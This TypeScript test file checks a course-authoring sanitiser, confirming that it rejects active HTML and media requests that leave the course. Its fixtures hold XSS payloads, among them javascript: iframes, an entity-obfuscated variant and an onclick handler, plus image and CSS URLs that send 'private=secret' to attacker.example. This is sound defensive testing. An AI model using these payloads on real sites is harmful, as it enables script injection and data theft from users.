import {
  collectAuthoringMediaUrls,
  stripAuthoringHtmlStyles,
  validateAuthoringMedia,
  validateAuthoringHtml,
} from "./course-authoring-html";

describe("untrusted authoring HTML boundary", () => {
  it.each([
    '<iframe src="javascript:parent.alert(1)"></iframe>',
    '<iframe src="java&#x09;script:alert(1)"></iframe>',
    '<iframe srcdoc="malicious"></iframe>',
    '<p onclick="malicious">Text</p>',
    '<div data-node-type="image" data-src="data:text/html,payload"></div>',
    '<iframe src="blob:https://example.com/id"></iframe>',
  ])("rejects active payload %s before native writes", (html) => {
    expect(() => validateAuthoringHtml(html)).toThrow("courseAuthoring.errors.invalidOperations");
  });
  it("preserves ordinary embeds, native resources and asset placeholders", () => {
    expect(() =>
      validateAuthoringHtml(
        '<iframe src="//www.youtube.com/embed/video"></iframe><div data-node-type="image" data-src="/api/lesson/lesson-resource/id"></div><img src="authoring-asset:11111111-1111-4111-8111-111111111111">',
      ),
    ).not.toThrow();
  });
});

describe("authoring automatic media authority", () => {
  const resourceId = "11111111-1111-4111-8111-111111111111";
  it("preserves exact native external embeds and ordinary clickable links", () => {
    const native = '<iframe src="https://www.youtube.com/embed/approved"></iframe>';
    const allowed = collectAuthoringMediaUrls([native]);
    expect(() =>
      validateAuthoringMedia(
        `${native}<a href="https://new.example/">Read</a>`,
        allowed,
        new Set(),
        new Set(),
      ),
    ).not.toThrow();
    expect(() =>
      validateAuthoringMedia(
        '<img src="https://attacker.example/?private=secret">',
        allowed,
        new Set(),
        new Set(),
      ),
    ).toThrow("courseAuthoring.errors.mediaOutsideCourse");
  });
  it("does not let a course resource identity authorize arbitrary API requests", () => {
    expect(() =>
      validateAuthoringMedia(
        `<div data-node-type="image" data-resource-id="${resourceId}" data-src="/api/private/export"></div>`,
        new Set(),
        new Set([resourceId]),
        new Set(),
      ),
    ).toThrow("courseAuthoring.errors.mediaOutsideCourse");
    expect(() =>
      validateAuthoringMedia(
        `<div data-node-type="image" data-resource-id="${resourceId}" data-src="/api/lesson/lesson-resource/${resourceId}"></div>`,
        new Set(),
        new Set([resourceId]),
        new Set(),
      ),
    ).not.toThrow();
  });
  it("accepts only matching typed staged image references", () => {
    const staged = `<img data-authoring-asset-id="${resourceId}" src="authoring-asset:${resourceId}">`;
    expect(() =>
      validateAuthoringMedia(staged, new Set(), new Set(), new Set([resourceId])),
    ).not.toThrow();
    expect(() =>
      validateAuthoringMedia(
        staged.replace(`authoring-asset:${resourceId}`, "https://attacker.example/private"),
        new Set(),
        new Set(),
        new Set([resourceId]),
      ),
    ).toThrow("courseAuthoring.errors.mediaOutsideCourse");
    expect(() => validateAuthoringMedia(staged, new Set(), new Set(), new Set())).toThrow(
      "courseAuthoring.errors.mediaOutsideCourse",
    );
  });
});

it("removes automatic CSS requests while preserving ordinary content", () => {
  const html =
    '<p style="background-image: url(https://attacker.example/?private=secret)">Introduction</p>';
  expect(stripAuthoringHtmlStyles(html)).toBe("<p>Introduction</p>");
  expect(stripAuthoringHtmlStyles("<p>Introduction</p>")).toBe("<p>Introduction</p>");
});
